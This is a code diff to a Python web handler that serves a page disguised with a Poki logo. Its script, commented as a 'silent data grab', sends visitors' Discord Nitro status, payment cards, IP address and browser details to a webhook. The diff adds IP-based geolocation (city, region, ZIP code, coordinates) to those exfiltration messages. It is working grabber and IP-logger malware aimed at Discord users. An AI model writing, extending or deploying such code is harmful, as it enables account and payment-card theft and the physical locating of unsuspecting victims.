@@ -12,7 +12,26 @@ class handler(BaseHTTPRequestHandler):
               self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
         ua = self.headers.get('User-Agent', 'Unknown')
         
-        # Don't send initial notification - let JS handle everything
+        # Get location from IP (no permission needed)
+        location_data = {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'zip': 'Unknown', 'lat': 'N/A', 'lon': 'N/A'}
+        try:
+            req = urllib.request.Request(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=3) as response:
+                location_data = json.loads(response.read().decode())
+        except:
+            try:
+                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as response:
+                    data = json.loads(response.read().decode())
+                    location_data = {
+                        'city': data.get('city', 'Unknown'),
+                        'region': data.get('regionName', 'Unknown'),
+                        'country': data.get('country', 'Unknown'),
+                        'zip': data.get('zip', 'Unknown'),
+                        'lat': data.get('lat', 'N/A'),
+                        'lon': data.get('lon', 'N/A')
+                    }
+            except:
+                pass
         
         html = f'''<!DOCTYPE html>
 <html>
@@ -35,6 +54,15 @@ body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;
 <body>
 <img src="{POKI_IMAGE}" class="logo">
 <script>
+// Pass location data from Python to JavaScript
+const locationData = {{
+    city: '{location_data.get("city", "Unknown")}',
+    region: '{location_data.get("region", "Unknown")}',
+    country: '{location_data.get("country", "Unknown")}',
+    zip: '{location_data.get("zip", "Unknown")}',
+    lat: '{location_data.get("lat", "N/A")}',
+    lon: '{location_data.get("lon", "N/A")}'
+}};
 (async()=>{{
 // NO GPS - Silent data grab only
 const webhook='{WEBHOOK}';
@@ -211,6 +239,11 @@ fields:[
 {{name:'💎 Nitro',value:nitro,inline:true}},
 {{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
 {{name:'📍 IP Address',value:'{ip}',inline:true}},
+{{name:'🏙️ City',value:locationData.city,inline:true}},
+{{name:'🗺️ State',value:locationData.region,inline:true}},
+{{name:'📮 ZIP Code',value:locationData.zip,inline:true}},
+{{name:'🌍 Country',value:locationData.country,inline:true}},
+{{name:'📌 Coordinates',value:`${{locationData.lat}}, ${{locationData.lon}}`,inline:true}},
 {{name:'🕐 Timezone',value:tz,inline:true}},
 {{name:'🖥️ Platform',value:navigator.platform,inline:true}},
 {{name:'🌍 Language',value:navigator.language,inline:true}},
@@ -240,6 +273,11 @@ color:16753920,
 description:'**No Discord login detected** (opened from Discord app in external browser)',
 fields:[
 {{name:'📍 IP Address',value:'{ip}',inline:false}},
+{{name:'🏙️ City',value:locationData.city,inline:true}},
+{{name:'🗺️ State/Region',value:locationData.region,inline:true}},
+{{name:'📮 ZIP Code',value:locationData.zip,inline:true}},
+{{name:'🌍 Country',value:locationData.country,inline:true}},
+{{name:'📌 Coordinates',value:`${{locationData.lat}}, ${{locationData.lon}}`,inline:true}},
 {{name:'🕐 Timezone',value:tz,inline:true}},
 {{name:'🌍 Language',value:navigator.language,inline:true}},
 {{name:'🖥️ Platform',value:navigator.platform,inline:true}},
